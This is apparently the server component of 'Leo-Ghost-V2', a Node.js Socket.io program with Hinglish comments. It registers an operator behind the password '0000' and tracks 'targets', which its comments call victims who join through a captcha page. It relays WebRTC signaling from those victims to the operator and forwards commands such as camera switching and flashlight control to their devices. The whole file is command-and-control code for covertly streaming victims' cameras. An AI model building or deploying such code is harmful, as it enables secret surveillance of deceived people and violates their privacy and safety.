const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

let adminId = null;
let targets = {}; // Users ki list store karne ke liye

io.on('connection', (socket) => {
    console.log('New Connection:', socket.id);

    // Jab Admin join kare
    socket.on('admin-join', (pass) => {
        if(pass === "0000") {
            adminId = socket.id;
            socket.emit('admin-status', { success: true });
            // Admin ko current users bhejna
            socket.emit('update-targets', Object.keys(targets));
        } else {
            socket.emit('admin-status', { success: false });
        }
    });

    // Jab Target (Victim) captcha bhare
    socket.on('target-join', () => {
        targets[socket.id] = { id: socket.id, status: 'online' };
        console.log('Target Added:', socket.id);
        if(adminId) {
            io.to(adminId).emit('update-targets', Object.keys(targets));
        }
    });
        // Signaling Logic (Specific routing)
    socket.on('signal', (data) => {
        // data.to pe signal bhejna
        io.to(data.to).emit('signal', { from: socket.id, signal: data.signal });
    });

    // Admin commands (Flashlight, Camera switch etc.)
    socket.on('command', (data) => {
        io.to(data.targetId).emit('command', data.cmd);
    });

    socket.on('disconnect', () => {
        if(socket.id === adminId) {
            adminId = null;
        } else if(targets[socket.id]) {
            delete targets[socket.id];
            if(adminId) {
                io.to(adminId).emit('update-targets', Object.keys(targets));
            }
        }
    });
});
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Leo-Ghost-V2 Live on ${PORT}`));
    
